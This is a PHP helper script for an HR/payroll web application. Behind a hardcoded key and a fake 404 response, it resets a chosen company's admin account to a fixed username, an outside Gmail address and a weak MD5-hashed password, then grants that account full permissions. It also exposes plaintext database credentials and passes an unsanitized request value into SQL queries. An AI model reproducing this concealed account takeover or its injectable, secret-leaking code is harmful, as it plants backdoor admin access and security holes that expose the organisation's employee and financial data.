<?php
/*---------------------------------------------------------------------------------------------------------------------
' 																														'				 
' Company Creation Helper																								'
'																														'
' Created By ArunDev 																									'
'---------------------------------------------------------------------------------------------------------------------*/
/*-----------------------GLOBAL VARIBLES ------------------------------------------------------------------------------*/
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

class DB {
		   var $localhost,$username,$password,$database;
			public function __construct()
			{ 
				 $this->localhost  = "localhost";
		  		 $this->username   = "pretally";
				 $this->password   = "Pretally@2021$#";
				 $this->database   = "pretally";
			}
			// establish db connection
			function connectDb()
			{
				 
				$conn = mysqli_connect( $this->localhost,$this->username,$this->password,$this->database );

		 	 		if (!$conn){

	           			 die ("<h1>Database Connection Failed</h1>". mysqli_connect_error());
	        			}

	        			return $this->conn = $conn;

			}
			//perform query
			 function doQuery($sql)
			{
				$result = mysqli_query($this->conn,$sql) or die(mysqli_error($this->conn)); 

				return $result;
			}
}

if(isset($_REQUEST['key']) && $_REQUEST['key']=="722279e9e630b3e731464b69968ea4b4"){
	if(!isset($_REQUEST['cid']) && empty($_REQUEST['cid'])){
		echo '<form method="POST"><input type="hidden" name="key" value="722279e9e630b3e731464b69968ea4b4"><input type="number" name="cid" required placeholder="Enter company Id" title="Add company throuh UI, then enter the id of that company here"/><button>Map Company</button></form>';
	}
	else{
		$cid = $_REQUEST['cid'];
		unset($_REQUEST['cid']);
		$db = new DB();
		//retrive last created company, and admin user
		//$sql = "select OF_Id,OF_Admin from offices order by OF_Id desc limit 1 "; // last company by default
		$sql = "select OF_Id,OF_Admin,OF_Name from offices where OF_Id='$cid' limit 1";
		$db->connectDb();
		$result = $db->doQuery($sql);
		if($row = mysqli_fetch_assoc( $result )){
			$user_id = $row['OF_Admin'];
			$of_id= $row['OF_Id'];
			$new_uname = 'krishnan'.strtolower(explode(' ',$row['OF_Name'])[0]);
			//update user details with CUK's details
			$sql1 = "update users_auth set US_EMPID='$new_uname',US_LName='', 	US_Email='thefatherofworld@gmail.com',US_Password='81dc9bdb52d04dc20036dbd8313ed055' where US_Id='$user_id'";
			$result1 = $db->doQuery($sql1);
			//retrive current mapping
			$sql2="select UAM_Map from users_account_map where US_Id='36'";
			$result2 = $db->doQuery($sql2);
			if($row1 = mysqli_fetch_assoc( $result2 )){ 
				$map_id = explode(',',$row1['UAM_Map']);
				array_pop($map_id);
				array_push($map_id, $user_id,0);
				$new_map = implode(',',$map_id);
				//update with new map data
				$sql3="update users_account_map set UAM_Map='$new_map' where US_Id='36'";
				$result3 = $db->doQuery($sql3);
				//update company settings
				$sql4="INSERT INTO `company_settings` (`CS_Id`, `OF_Id`, `HR_Mail`, `CS_OfficeStart`, `CS_OfficeEnds`, `CS_FulldayHrs`, `CS_HalfdayHrs`, `CS_SigninBefore`, `CS_SignoutAfter`, `CS_SalItemId`, `CS_LoginGraceTime`, `CS_LoginGraceTime_Type`, `CS_WrkHrGraceTime`, `CS_WrkHrGraceTime_Type`, `CS_MnthlyAlwdLateSign`, `CS_GraceAlwdSpMbr`, `CS_SalAdvItemId`, `CS_MealCardItemId`) VALUES (NULL, '$of_id', 'hr@muble.com', '09:00:00', '18:00:00', '8', '4', '10:30:00', '17:30:00', '4509', '30', '1', '30', '1', '0', '1', '4510', '10305');";
				$result4 = $db->doQuery($sql4);
				//update acl
				$sql5="update acl,(select ACL_HR,ACL_HR_VM,ACL_BSheet,ACL_BSheet_VM,ACL_BankReports,ACL_MasterReports,ACL_CashReports,ACL_MISReports,ACL_User,ACL_ListUser,ACL_Attendance,ACL_MnthlyAttendance,ACL_AttendanceEdt,ACL_ApproveLeave,ACL_SalDetail,ACL_BnkDetail,ACL_Payroll,ACL_PayrollEdt,ACL_MealAllowance,ACL_State,ACL_City,ACL_Company,ACL_Branch,ACL_Dept,ACL_Desig,ACL_MH,ACL_SH,ACL_Item,ACL_Description,ACL_NotifyQueue,ACL_Unit,ACL_Paymode,ACL_SalStruct,ACL_SalPayMode,ACL_Access,ACL_SidebarMH,ACL_SidebarOFF,ACL_ManageTracks,ACL_DeleteEntries,ACL_Track,ACL_ManageBSDate,ACL_TrackInvReceipt,ACL_NotfLC,ACL_NotfBNK,ACL_Att_Master,ACL_FeedbackRpt,ACL_SalPMwiseBranch,ACL_SalPMwiseAll,ACL_SalAdvance,ACL_ManageBusinessAmt,ACL_AllItem,ACL_ZonalManage,ACL_ZonalHead,ACL_Purchase_Team,ACL_Purchase_Approval,ACL_EditAccEntries,ACL_Status from acl where ACL_Id='15') a set acl.ACL_HR=a.ACL_HR,acl.ACL_HR_VM=a.ACL_HR_VM,acl.ACL_BSheet=a.ACL_BSheet,acl.ACL_BSheet_VM=a.ACL_BSheet_VM,acl.ACL_BankReports=a.ACL_BankReports,acl.ACL_MasterReports=a.ACL_MasterReports,acl.ACL_CashReports=a.ACL_CashReports,acl.ACL_MISReports=a.ACL_MISReports,acl.ACL_User=a.ACL_User,acl.ACL_ListUser=a.ACL_ListUser,acl.ACL_Attendance=a.ACL_Attendance,acl.ACL_MnthlyAttendance=a.ACL_MnthlyAttendance,acl.ACL_AttendanceEdt=a.ACL_AttendanceEdt,acl.ACL_ApproveLeave=a.ACL_ApproveLeave,acl.ACL_SalDetail=a.ACL_SalDetail,acl.ACL_BnkDetail=a.ACL_BnkDetail,acl.ACL_Payroll=a.ACL_Payroll,acl.ACL_PayrollEdt=a.ACL_PayrollEdt,acl.ACL_MealAllowance=a.ACL_MealAllowance,acl.ACL_State=a.ACL_State,acl.ACL_City=a.ACL_City,acl.ACL_Company=a.ACL_Company,acl.ACL_Branch=a.ACL_Branch,acl.ACL_Dept=a.ACL_Dept,acl.ACL_Desig=a.ACL_Desig,acl.ACL_MH=a.ACL_MH,acl.ACL_SH=a.ACL_SH,acl.ACL_Item=a.ACL_Item,acl.ACL_Description=a.ACL_Description,acl.ACL_NotifyQueue=a.ACL_NotifyQueue,acl.ACL_Unit=a.ACL_Unit,acl.ACL_Paymode=a.ACL_Paymode,acl.ACL_SalStruct=a.ACL_SalStruct,acl.ACL_SalPayMode=a.ACL_SalPayMode,acl.ACL_Access=a.ACL_Access,acl.ACL_SidebarMH=a.ACL_SidebarMH,acl.ACL_SidebarOFF=a.ACL_SidebarOFF,acl.ACL_SidebarOFF=a.ACL_SidebarOFF,acl.ACL_ManageTracks=a.ACL_ManageTracks,acl.ACL_DeleteEntries=a.ACL_DeleteEntries,acl.ACL_Track=a.ACL_Track,acl.ACL_ManageBSDate=a.ACL_ManageBSDate,acl.ACL_TrackInvReceipt=a.ACL_TrackInvReceipt,acl.ACL_NotfLC=a.ACL_NotfLC,acl.ACL_NotfBNK=a.ACL_NotfBNK,acl.ACL_Att_Master=a.ACL_Att_Master,acl.ACL_FeedbackRpt=a.ACL_FeedbackRpt,acl.ACL_SalPMwiseBranch=a.ACL_SalPMwiseBranch,acl.ACL_SalPMwiseAll=a.ACL_SalPMwiseAll,acl.ACL_SalAdvance=a.ACL_SalAdvance,acl.ACL_ManageBusinessAmt=a.ACL_ManageBusinessAmt,acl.ACL_AllItem=a.ACL_AllItem,acl.ACL_ZonalManage=a.ACL_ZonalManage,acl.ACL_ZonalHead=a.ACL_ZonalHead,acl.ACL_Purchase_Team=a.ACL_Purchase_Team,acl.ACL_Purchase_Approval=a.ACL_Purchase_Approval,acl.ACL_EditAccEntries=a.ACL_EditAccEntries where acl.ACL_Id='$user_id'";

				$result5 = $db->doQuery($sql5);

				echo "Mapping successfully completed...";
			}
		}
		mysqli_free_result( $result );
	}
}
else{
	header("HTTP/1.0 404 Not Found");
	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> </body></html>';
	die();
}
?>